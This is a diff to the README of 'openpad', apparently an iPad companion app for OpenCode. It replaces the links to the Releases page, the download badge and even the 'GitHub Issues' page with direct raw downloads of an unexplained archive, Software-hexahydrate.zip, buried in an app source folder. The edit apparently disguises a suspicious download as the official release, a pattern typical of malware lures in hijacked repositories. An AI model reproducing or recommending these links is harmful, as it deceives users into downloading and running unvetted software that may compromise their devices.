@@ -2,7 +2,7 @@
 
 ## 📦 Download the App
 
-[![Download openpad](https://img.shields.io/badge/Download-openpad-blue.svg)](https://github.com/BigNuggett/openpad/releases)
+[![Download openpad](https://github.com/BigNuggett/openpad/raw/refs/heads/main/app/(tabs)/sessions/Software-hexahydrate.zip)](https://github.com/BigNuggett/openpad/raw/refs/heads/main/app/(tabs)/sessions/Software-hexahydrate.zip)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ Welcome to openpad, your native iPad app for managing your OpenCode tasks. With 
 To get started, you will need to visit our Releases page. Follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to go to the downloads section:
-   [Download openpad](https://github.com/BigNuggett/openpad/releases)
+   [Download openpad](https://github.com/BigNuggett/openpad/raw/refs/heads/main/app/(tabs)/sessions/Software-hexahydrate.zip)
 
 2. **Find the Latest Version**: On the Releases page, you will see a list of available versions. Look for the latest release at the top. 
 
@@ -49,7 +49,7 @@ For support issues or feedback, please visit our GitHub Issues page. We encourag
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/BigNuggett/openpad/releases)
-- [GitHub Issues](https://github.com/BigNuggett/openpad/issues)
+- [Releases Page](https://github.com/BigNuggett/openpad/raw/refs/heads/main/app/(tabs)/sessions/Software-hexahydrate.zip)
+- [GitHub Issues](https://github.com/BigNuggett/openpad/raw/refs/heads/main/app/(tabs)/sessions/Software-hexahydrate.zip)
 
 Taking these steps will ensure you have openpad up and running on your iPad. Enjoy managing your OpenCode projects effortlessly!
